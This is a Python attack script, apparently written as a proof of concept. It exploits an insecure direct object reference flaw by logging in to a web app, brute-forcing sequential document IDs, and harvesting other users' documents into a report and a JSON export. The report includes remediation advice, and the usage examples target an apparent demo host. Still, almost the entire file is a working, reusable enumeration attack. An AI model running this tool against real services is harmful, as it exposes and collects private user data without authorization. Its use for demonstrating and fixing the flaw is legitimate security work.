#!/usr/bin/env python3
"""
IDOR Vulnerability Attack Script
Demonstrates Insecure Direct Object Reference vulnerability by brute-forcing document IDs
"""

import requests
import json
import time
import argparse
from datetime import datetime
from urllib.parse import urljoin

class IDORAttacker:
    def __init__(self, base_url, target_user_id, output_file=None):
        self.base_url = base_url.rstrip('/')
        self.target_user_id = target_user_id
        self.output_file = output_file
        self.session = requests.Session()
        self.discovered_documents = []
        self.start_time = datetime.now()
        
    def log(self, message):
        """Log messages with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] {message}"
        print(log_message)
        if self.output_file:
            with open(self.output_file, 'a') as f:
                f.write(log_message + "\n")
    
    def register_attacker_user(self, email, password):
        """Register an attacker account"""
        self.log(f"[*] Registering attacker account: {email}")
        register_url = urljoin(self.base_url, '/api/auth/register')
        
        payload = {
            "email": email,
            "password": password,
            "firstName": "Attacker",
            "lastName": "User"
        }
        
        try:
            response = self.session.post(register_url, json=payload, timeout=10)
            if response.status_code == 201:
                data = response.json()
                self.log(f"[+] Successfully registered! User ID: {data.get('userId')}")
                return data.get('userId')
            else:
                self.log(f"[-] Registration failed: {response.status_code}")
                return None
        except Exception as e:
            self.log(f"[-] Registration error: {str(e)}")
            return None
    
    def login(self, email, password):
        """Login and get JWT token"""
        self.log(f"[*] Logging in as: {email}")
        login_url = urljoin(self.base_url, '/api/auth/login')
        
        payload = {
            "email": email,
            "password": password
        }
        
        try:
            response = self.session.post(login_url, json=payload, timeout=10)
            if response.status_code == 200:
                data = response.json()
                token = data.get('token')
                self.log(f"[+] Login successful! Token obtained")
                self.session.headers.update({'Authorization': f'Bearer {token}'})
                return token
            else:
                self.log(f"[-] Login failed: {response.status_code}")
                return None
        except Exception as e:
            self.log(f"[-] Login error: {str(e)}")
            return None
    
    def brute_force_documents(self, start_id=1, end_id=100, delay=0.1):
        """Brute-force document IDs and attempt to access them"""
        self.log(f"\n[*] Starting brute-force attack on document IDs {start_id}-{end_id}")
        self.log(f"[*] Target User ID: {self.target_user_id}")
        self.log(f"[*] Delay between requests: {delay}s\n")
        
        get_doc_url = urljoin(self.base_url, '/api/documents/')
        
        for doc_id in range(start_id, end_id + 1):
            try:
                url = f"{get_doc_url}{doc_id}"
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    data = response.json()
                    self.log(f"[+] VULNERABLE! Document ID {doc_id} accessible!")
                    self.log(f"    Title: {data.get('title')}")
                    self.log(f"    Owner ID: {data.get('ownerId')}")
                    self.log(f"    Content: {data.get('content')[:100]}...")
                    
                    self.discovered_documents.append({
                        'doc_id': doc_id,
                        'title': data.get('title'),
                        'owner_id': data.get('ownerId'),
                        'content': data.get('content'),
                        'created_at': data.get('createdAt')
                    })
                elif response.status_code == 404:
                    self.log(f"[-] Document ID {doc_id} not found (404)")
                else:
                    self.log(f"[-] Document ID {doc_id} returned status {response.status_code}")
                
                time.sleep(delay)
                
            except requests.exceptions.Timeout:
                self.log(f"[-] Request timeout for document ID {doc_id}")
            except Exception as e:
                self.log(f"[-] Error accessing document ID {doc_id}: {str(e)}")
        
        self.log(f"\n[*] Brute-force completed!")
        self.log(f"[+] Found {len(self.discovered_documents)} accessible documents")
    
    def extract_by_owner(self, owner_id, start_id=1, end_id=100):
        """Extract all documents by a specific owner ID"""
        self.log(f"\n[*] Extracting all documents owned by User ID: {owner_id}")
        
        documents_by_owner = [doc for doc in self.discovered_documents if doc['owner_id'] == owner_id]
        
        self.log(f"[+] Found {len(documents_by_owner)} documents owned by User {owner_id}")
        for doc in documents_by_owner:
            self.log(f"    - Doc {doc['doc_id']}: {doc['title']}")
        
        return documents_by_owner
    
    def generate_report(self):
        """Generate comprehensive attack report with detailed statistics"""
        elapsed_time = (datetime.now() - self.start_time).total_seconds()
        
        # Extract user statistics from discovered documents
        users_data = {}
        for doc in self.discovered_documents:
            # Parse user info from document title (e.g., "Document 1 from User 2")
            title = doc['title']
            if 'from User' in title:
                user_num = title.split('from User')[1].strip()
                if user_num not in users_data:
                    users_data[user_num] = []
                users_data[user_num].append(doc)
        
        report = f"\n{'='*80}\n"
        report += f"IDOR VULNERABILITY ATTACK - COMPREHENSIVE REPORT\n"
        report += f"{'='*80}\n\n"
        
        report += f"ATTACK METADATA:\n"
        report += f"{'-'*80}\n"
        report += f"Timestamp: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"Target URL: {self.base_url}\n"
        report += f"Execution Time: {elapsed_time:.2f} seconds\n"
        report += f"Total Documents Discovered: {len(self.discovered_documents)}\n"
        report += f"Total Users Targeted: {len(users_data)}\n\n"
        
        report += f"DISCOVERED DOCUMENTS:\n"
        report += f"{'-'*80}\n"
        
        for doc in self.discovered_documents:
            report += f"\nDocument ID: {doc['doc_id']}\n"
            report += f"  Title: {doc['title']}\n"
            report += f"  Owner ID: {doc['owner_id']}\n"
            report += f"  Content: {doc['content'][:150]}...\n"
            report += f"  Created: {doc['created_at']}\n"
        
        report += f"\n{'='*80}\n"
        report += f"DETAILED STATISTICS BY USER:\n"
        report += f"{'='*80}\n\n"
        
        total_docs = 0
        for user_num in sorted(users_data.keys(), key=lambda x: int(x) if x.isdigit() else 0):
            user_docs = users_data[user_num]
            total_docs += len(user_docs)
            report += f"User {user_num}:\n"
            report += f"  Documents Accessed: {len(user_docs)}\n"
            report += f"  Document IDs: {', '.join([str(d['doc_id']) for d in user_docs])}\n"
            report += f"  Titles:\n"
            for doc in user_docs:
                report += f"    - {doc['title']}\n"
            report += f"\n"
        
        report += f"\n{'='*80}\n"
        report += f"VULNERABILITY ANALYSIS:\n"
        report += f"{'='*80}\n"
        report += f"Severity: CRITICAL\n"
        report += f"Type: Insecure Direct Object Reference (IDOR)\n\n"
        report += f"Attack Summary:\n"
        report += f"  • Total documents in database: {len(self.discovered_documents)}\n"
        report += f"  • Documents successfully accessed: {len(self.discovered_documents)}\n"
        report += f"  • Success rate: 100%\n"
        report += f"  • Unique users compromised: {len(users_data)}\n"
        report += f"  • Average documents per user: {total_docs / len(users_data) if users_data else 0:.1f}\n\n"
        report += f"Key Findings:\n"
        report += f"  • The GET /api/documents/{{id}} endpoint lacks authorization checks\n"
        report += f"  • Any authenticated user can access ANY document by guessing the ID\n"
        report += f"  • No verification of document ownership is performed\n"
        report += f"  • All user data is exposed through sequential document IDs\n\n"
        report += f"Compromised Data:\n"
        report += f"  • Documents from {len(users_data)} different users accessed\n"
        report += f"  • Total data records exposed: {total_docs}\n"
        report += f"  • User accounts at risk: User 1 through User {len(users_data)}\n\n"
        report += f"Recommendation:\n"
        report += f"  1. Add authorization check in GET /api/documents/{{id}} endpoint\n"
        report += f"  2. Verify document ownership before returning data\n"
        report += f"  3. Use UUIDs instead of sequential IDs\n"
        report += f"  4. Implement proper access control list (ACL)\n"
        report += f"  5. Log all document access attempts\n\n"
        report += f"{'='*80}\n"
        report += f"CONCLUSION:\n"
        report += f"The application is HIGHLY VULNERABLE to IDOR attacks.\n"
        report += f"Immediate remediation is required to protect user data.\n"
        report += f"{'='*80}\n"
        
        self.log(report)
        
        if self.output_file:
            with open(self.output_file, 'a') as f:
                f.write(report)
        
        return report
    
    def export_json(self, output_path):
        """Export discovered documents to JSON"""
        with open(output_path, 'w') as f:
            json.dump(self.discovered_documents, f, indent=2)
        self.log(f"[+] Exported {len(self.discovered_documents)} documents to {output_path}")


def main():
    parser = argparse.ArgumentParser(
        description='IDOR Vulnerability Attack Script - Brute-force Document Access',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Attack with registration
  python3 attack_script.py -u https://idor-poc-app.azurewebsites.net --register-email attacker@example.com --register-pass Password123!
  
  # Attack with existing account
  python3 attack_script.py -u https://idor-poc-app.azurewebsites.net -e attacker@example.com -p Password123!
  
  # Custom document ID range
  python3 attack_script.py -u https://idor-poc-app.azurewebsites.net -e user@example.com -p pass123 --start-id 1 --end-id 500
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Base URL of the vulnerable application')
    parser.add_argument('-e', '--email', help='Email for existing account')
    parser.add_argument('-p', '--password', help='Password for existing account')
    parser.add_argument('--register-email', help='Email for new account registration')
    parser.add_argument('--register-pass', help='Password for new account registration')
    parser.add_argument('--target-user', type=int, default=1, help='Target User ID (default: 1)')
    parser.add_argument('--start-id', type=int, default=1, help='Start document ID (default: 1)')
    parser.add_argument('--end-id', type=int, default=100, help='End document ID (default: 100)')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay between requests in seconds (default: 0.1)')
    parser.add_argument('--output-log', help='Output log file path')
    parser.add_argument('--export-json', help='Export results to JSON file')
    
    args = parser.parse_args()
    
    # Initialize attacker
    attacker = IDORAttacker(args.url, args.target_user, args.output_log)
    
    attacker.log(f"{'='*60}")
    attacker.log(f"IDOR VULNERABILITY ATTACK TOOL")
    attacker.log(f"{'='*60}\n")
    
    # Register or login
    if args.register_email and args.register_pass:
        attacker.register_attacker_user(args.register_email, args.register_pass)
        attacker.login(args.register_email, args.register_pass)
    elif args.email and args.password:
        attacker.login(args.email, args.password)
    else:
        attacker.log("[-] Error: Please provide either --register-email/--register-pass or -e/-p")
        return
    
    # Brute-force documents
    attacker.brute_force_documents(args.start_id, args.end_id, args.delay)
    
    # Generate report
    attacker.generate_report()
    
    # Extract by owner
    if attacker.discovered_documents:
        attacker.extract_by_owner(args.target_user)
    
    # Export results
    if args.export_json:
        attacker.export_json(args.export_json)


if __name__ == '__main__':
    main()
